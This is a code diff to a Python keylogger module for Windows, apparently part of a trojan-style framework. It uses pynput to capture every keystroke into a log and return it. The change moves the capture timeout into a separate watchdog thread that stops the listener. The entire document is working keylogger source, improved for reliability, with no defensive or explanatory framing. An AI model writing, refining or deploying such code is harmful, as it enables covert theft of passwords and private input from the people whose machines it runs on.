@@ -1,4 +1,5 @@
 from ctypes import byref, create_string_buffer, c_long, windll
+import threading
 from pynput import keyboard
 from io import StringIO
 import time
@@ -53,6 +54,11 @@ class Keylogger:
         print(key_str, end='', flush=True)
         self.log.write(key_str)
 
+def timeout_check(listener, start_time, timeout):
+    while time.time() - start_time < timeout:
+        time.sleep(1)
+    listener.stop()
+
 def run(**args):
     print("[*] In keylogger module.")
     kl = Keylogger()
@@ -62,12 +68,15 @@ def run(**args):
 
     def on_press(key):
         kl.mykeystroke(key)
-        if time.time() - start_time > TIMEOUT:
-            return False  # Stop listener
 
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
+    listener = keyboard.Listener(on_press=on_press)
+
+    # Start the timeout check in a separate thread
+    timeout_thread = threading.Thread(target=timeout_check, args=(listener, start_time, TIMEOUT))
+    timeout_thread.start()
+
+    listener.start()
+    listener.join()
 
     print("value:", kl.log.getvalue())
-
     return kl.log.getvalue()
